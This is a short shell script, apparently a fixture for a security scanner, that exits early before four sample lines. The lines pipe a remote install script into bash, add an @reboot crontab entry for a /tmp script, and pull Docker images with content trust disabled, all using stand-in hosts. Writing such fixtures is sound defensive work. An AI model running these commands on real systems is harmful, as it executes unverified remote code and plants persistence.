#!/bin/sh
# INERT scanner fixture. Stop before all scanner-positive examples.
echo "INERT scanner fixture"
exit 0

curl https://example.invalid/install.sh | bash
echo "@reboot /tmp/fixture-agent.sh" | crontab -
docker pull --disable-content-trust example.invalid/demo:latest
DOCKER_CONTENT_TRUST=0 docker pull example.invalid/demo:latest
